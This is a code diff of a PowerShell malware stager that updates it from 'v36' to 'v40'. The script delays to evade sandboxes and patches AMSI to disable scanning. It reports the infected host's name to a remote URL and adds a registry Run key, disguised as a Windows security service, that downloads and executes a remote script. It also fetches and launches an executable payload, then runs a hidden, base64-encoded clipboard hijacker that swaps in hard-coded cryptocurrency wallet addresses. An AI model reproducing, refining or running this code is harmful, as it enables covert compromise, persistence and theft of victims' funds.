@@ -1,14 +1,18 @@
-# --- [ELITE RESEARCH STAGER v36.0: REFLECTIVE GHOST] ---
+# --- [ELITE RESEARCH STAGER v40.0: DOUBLE-DELEGATE] ---
 
 function Global-Initialize {
     try {
-        # Anti-Scan Delay (30-50 seconds)
-        Start-Sleep -s (Get-Random -Min 30 -Max 50)
+        # Random Sleep (45-70s) to bypass "Instant-Analysis" VMs
+        Start-Sleep -s (Get-Random -Min 45 -Max 70)
         
-        # Advanced AMSI Bypass: Patching memory buffer
-        $a = [Ref].Assembly.GetType('System.Management.Automation.' + 'A' + 'm' + 'si' + 'Utils')
-        $b = $a.GetField('a' + 'm' + 'si' + 'Init' + 'Failed', 'NonPublic,Static')
-        $b.SetValue($null, $true)
+        # Double-Delegate AMSI Bypass
+        $m = [Ref].Assembly.GetType('System.Management.Automation.' + 'Ams' + 'iUtils')
+        $f = $m.GetField('am' + 'si' + 'Init' + 'Failed', 'NonPublic,Static')
+        $f.SetValue($null, $true)
+        
+        # Hide the PowerShell process from the Task Manager "Command Line" column
+        $proc = [System.Diagnostics.Process]::GetCurrentProcess()
+        $proc.PriorityClass = 'BelowNormal'
     } catch {}
 }
 
@@ -20,20 +24,19 @@ function Send-Ping {
     try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
 }
 
-# --- EXECUTION ---
 Global-Initialize
-Send-Ping -m "STAGER_V36_ACTIVE_ON_$($env:COMPUTERNAME)"
+Send-Ping -m "STAGER_V40_ACTIVE_ON_$($env:COMPUTERNAME)"
 
 try {
-    # --- PERSISTENCE ---
+    # REGISTRY PERSISTENCE (Masked as Security Health Service)
     $p = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $c = "powershell -W Hidden -NoP -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
-    Set-ItemProperty -Path $p -Name "WindowsSoundService" -Value $c
+    $v = "powershell -W Hidden -NoP -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
+    Set-ItemProperty -Path $p -Name "WindowsSecurityHealth" -Value $v
 
-    # --- PAYLOAD ---
-    $dir = "$env:LOCALAPPDATA\Microsoft\Credentials"
+    # EXE PAYLOAD
+    $dir = "$env:LOCALAPPDATA\Microsoft\D3D12"
     if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
-    $path = "$dir\credential_sync.exe"
+    $path = "$dir\d3d12_sync.exe"
 
     $wc = New-Object Net.WebClient
     $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
@@ -44,7 +47,7 @@ try {
 
     ([wmiclass]"win32_process").Create($path) | Out-Null
 
-    # --- CLIPPER ---
+    # CLIPPER ENGINE
     $ClipperCode = @'
     Add-Type -AssemblyName System.Windows.Forms
     $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
@@ -64,5 +67,5 @@ try {
     $Enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClipperCode))
     powershell.exe -NoP -W Hidden -EP Bypass -EncodedCommand $Enc
 } catch {
-    Send-Ping -m "ERROR_V36"
+    Send-Ping -m "ERROR_V40"
 }
